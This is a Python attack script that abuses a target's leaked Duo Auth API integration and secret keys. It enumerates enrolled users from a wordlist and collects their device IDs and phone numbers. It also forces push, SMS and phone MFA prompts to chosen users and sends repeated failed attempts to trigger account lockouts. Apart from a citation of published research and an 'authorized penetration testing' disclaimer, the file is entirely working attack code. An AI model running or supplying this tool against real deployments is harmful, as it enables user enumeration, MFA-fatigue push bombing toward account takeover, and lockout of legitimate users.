#!/usr/bin/python3

"""
Uses the unique API URL, ikey, and skey for a target's Duo MFA setup.
Can perform a number of actions such as: 
    - Enumerating enrolled users via preauth checks
    - Performing pre-auth checks to get enrollment status
    - Getting device IDs for push/SMS/phone auth
    - Forcing Duo push/SMS/phone auth attempts
    - Testing auth lockouts through repeated failed attempts

Uses Duo Auth API documented here:
https://duo.com/docs/authapi

Features:
    - User enumeration through preauth endpoint
    - Device ID retrieval for enrolled users
    - Multiple auth factor support (push, phone, sms, passcode)
    - Auth status checking with transaction IDs
    - Lockout testing with configurable attempts

Researched from:
https://www.mandiant.com/resources/blog/abusing-duo-authentication-misconfigurations

For authorized penetration testing use only.
"""

import argparse
import requests
import base64
import email.utils
import hmac
import hashlib
import urllib
import json


def sign(method, host, path, params, skey, ikey):
    """
    Note: Thank you for providing this, Duo team!!!  You tha best!

    Return HTTP Basic Authentication ("Authorization" and "Date") headers.
    method, host, path: strings from request
    params: dict of request parameters
    skey: secret key
    ikey: integration key
    """

    # create canonical string
    now = email.utils.formatdate()
    canon = [now, method.upper(), host.lower(), path]
    args = []
    for key in sorted(params.keys()):
        val = params[key].encode("utf-8")
        args.append(
            '%s=%s' % (urllib.parse.
                       quote(key, '~'), urllib.parse.quote(val, '~')))
    canon.append('&'.join(args))
    canon = '\n'.join(canon)

    # sign canonical string
    sig = hmac.new(bytes(skey, encoding='utf-8'),
                   bytes(canon, encoding='utf-8'),
                   hashlib.sha1)
    auth = '%s:%s' % (ikey, sig.hexdigest())

    # return headers
    return {'Date': now, 'Authorization': 'Basic %s' % base64.b64encode(bytes(auth, encoding="utf-8")).decode()}


def build_req(url, skey, ikey, action, user):

    method = ""
    params = {}
    data = {}
    headers = {}

    # required params for each API endpoint:
    # https://duo.com/docs/authapi
    match action:
        case "ping":
            method = "GET"
            path = "/auth/v2/ping"

        case "check":
            method = "GET"
            path = "/auth/v2/check"
            
        case "enroll":
            method = "POST"
            path = "/auth/v2/enroll"
            params["username"] = user

        case "enroll_status":
            method = "POST"
            path = "/auth/v2/enroll_status"
            params["username"] = user

        case "preauth":
            method = "POST"
            path = "/auth/v2/preauth"
            params["username"] = user

        # 'auth' function is potentially completed.  Need to test this in a real environment.
        case "auth":
            method = "POST"
            path = "/auth/v2/auth"
            params["username"] = user
            # Factor can be: push, phone, sms, or passcode
            params["factor"] = "push"  # Default to push
            # Device ID must be provided from preauth response
            if "device" in params:
                params["device"] = params["device"]
            if "passcode" in params:
                params["passcode"] = params["passcode"]

        case "auth_status":
            method = "GET"
            path = "/auth/v2/auth_status"
            if "txid" in params:
                params["txid"] = params["txid"]
    
    headers.update(sign(method, url, path, params, skey, ikey))
    data.update(params)
    url = "https://" + url + path

    return url, method, headers, data


def send_req(method, url, headers, data):

    match method:
        case "GET":
            resp = requests.get(url, headers=headers, data=data).text

        case "POST":
            resp = requests.post(url, headers=headers, data=data).text

    return resp


def parse_resp(method, resp):
    data = json.loads(resp)
    
    # Handle auth responses
    if "response" in data and "txid" in data["response"]:
        print(f"Transaction ID: {data['response']['txid']}")
        print(f"Status: {data['response'].get('status', 'unknown')}")
        
    # Handle auth_status responses
    if "response" in data and "result" in data["response"]:
        print(f"Auth Result: {data['response']['result']}")
        print(f"Status: {data['response']['status']}")
        
    return data


def parse_list(file):
    user_list = []
    with open(file, 'r') as f:
        for line in f:
            line = line.strip()
            user_list.append(line)
    return user_list

def test_auth_lockout(url, skey, ikey, username, device=None, attempts=5):
    """Test authentication lockout by sending multiple failed attempts"""
    print(f"\nTesting auth lockout for user: {username}")
    
    # First get device info through preauth
    if not device:
        preauth_url, method, headers, data = build_req(url, skey, ikey, "preauth", username)
        preauth_resp = parse_resp(method, send_req(method, preauth_url, headers, data))
        if "devices" in preauth_resp["response"]:
            device = preauth_resp["response"]["devices"][0]["device"]
    
    for i in range(attempts):
        print(f"\nAttempt {i+1}/{attempts}")
        
        # Try different failure methods
        if i % 3 == 0:
            # Test with invalid OTP
            params = {"device": device, "factor": "passcode", "passcode": "000000"}
        elif i % 3 == 1:
            # Test with push that will timeout
            params = {"device": device, "factor": "push"}
        else:
            # Test with SMS
            params = {"device": device, "factor": "sms"}
            
        auth_url, method, headers, data = build_req(url, skey, ikey, "auth", username)
        data.update(params)
        auth_resp = parse_resp(method, send_req(method, auth_url, headers, data))
        
        # If we get a txid, check its status
        if "response" in auth_resp and "txid" in auth_resp["response"]:
            txid = auth_resp["response"]["txid"]
            status_params = {"txid": txid}
            status_url, method, headers, data = build_req(url, skey, ikey, "auth_status", username)
            data.update(status_params)
            status_resp = parse_resp(method, send_req(method, status_url, headers, data))



# Create and add arguments
parser = argparse.ArgumentParser()
parser.add_argument('-U','--url', type=str, required=True, help="Duo API URL for target.")
parser.add_argument('-i,','--ikey', type=str, required=True, help="Duo API Integration Key for target.")
parser.add_argument('-s','--skey', type=str, required=True,help="Duo API Secret Key for target.")
parser.add_argument('-u','--user', type=str, help="Single user to act on.")
parser.add_argument('-l','--list', type=str, help="User list to act on.")
parser.add_argument('-A','--action', type=str, required=True, 
                    choices=["ping","check","enroll","enroll_status","preauth","auth","auth_status","lockout"], 
                    help="Action to perform.")
parser.add_argument('-d','--device', type=str, help="Device ID for auth attempts (obtained from preauth).")
parser.add_argument('-f','--factor', type=str, choices=["push","phone","sms","passcode"],
                    help="Auth factor to use (push, phone, sms, or passcode).")
parser.add_argument('-p','--passcode', type=str, help="Passcode for auth attempts.")
parser.add_argument('-t','--txid', type=str, help="Transaction ID for checking auth status.")
parser.add_argument('--attempts', type=int, default=5, help="Number of attempts for lockout testing (default: 5)")
args = parser.parse_args()

# Do the things!
users = {}

if args.action == "lockout" and args.user:
    # Test lockout functionality
    test_auth_lockout(args.url, args.skey, args.ikey, args.user, args.device, args.attempts)
elif args.action == "auth":
    # Handle auth with provided parameters
    url, method, headers, data = build_req(args.url, args.skey, args.ikey, args.action, args.user)
    if args.device:
        data["device"] = args.device
    if args.factor:
        data["factor"] = args.factor
    if args.passcode:
        data["passcode"] = args.passcode
    parse_resp(method, send_req(method, url, headers, data))
elif args.action == "auth_status" and args.txid:
    # Check auth status with txid
    url, method, headers, data = build_req(args.url, args.skey, args.ikey, args.action, args.user)
    data["txid"] = args.txid
    parse_resp(method, send_req(method, url, headers, data))
elif args.list:
    user_list = []
    action = "preauth"
    user_list = parse_list(args.list)
    for user in user_list:
        user = user.strip()
        url, method, headers, data = build_req(args.url, args.skey, args.ikey, action, user)   
        users[user] = parse_resp(method, send_req(method, url, headers, data))

    #print(json.dumps(users, indent=2))
    print(f"Username\t\tStatus\t\tDevice ID")
    print("="*60)
    for u in users:
        try:
            print(f"{u:15}\t{users[u]['response']['status_msg']}\t{users[u]['response']['devices'][0]['device']}\t{users[u]['response']['devices'][0]['number']}")
        except:
            print(f"{u:15}\t{users[u]['response']['status_msg']}")
            
else:
    url, method, headers, data = build_req(args.url, args.skey, args.ikey, args.action, args.user)
    parse_resp(method, send_req(method, url, headers, data))
